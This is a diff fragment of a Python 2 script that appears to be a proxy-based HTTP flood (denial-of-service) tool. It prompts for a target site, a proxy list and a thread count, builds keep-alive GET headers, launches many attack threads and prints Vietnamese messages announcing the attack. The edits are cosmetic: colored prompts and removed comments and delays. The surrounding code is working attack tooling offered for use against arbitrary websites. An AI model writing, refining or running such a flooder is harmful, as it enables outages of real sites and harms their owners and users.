@@ -316,17 +316,13 @@ print ("\033[31m/_/  /_/|_|\____/_/|_|   /_/____/____/\____/___/ \033[0m")
 print ("\033[33m                     Instagram : @bossy.078 \033[0m")                                               
 print (" ")
 
-# Site
-url = raw_input("Hedef : ")
+url = raw_input("\033[93m [+] Hedef : \033[1m")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
- 
-#Proxy
-in_file = open(raw_input("Proxy : "),"r")
+in_file = open(raw_input("\033[94m [+] Proxy : \033[1m"),"r")
 proxyf = in_file.read()
 in_file.close()
- 
 listaproxy = proxyf.split('\n')
-thread = input("Threads : ")
+thread = input("\033[95m Threads : \033[1m")
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
@@ -335,9 +331,6 @@ x = 0
  
 for x in xrange(thread):
     attacco().start()
-    time.sleep(0.003)
-print "Dang tan cong..."
-print "Chuc ban may man..."
 print "Ctrl + C de dung tan cong..."
 nload = 0
 while not nload:
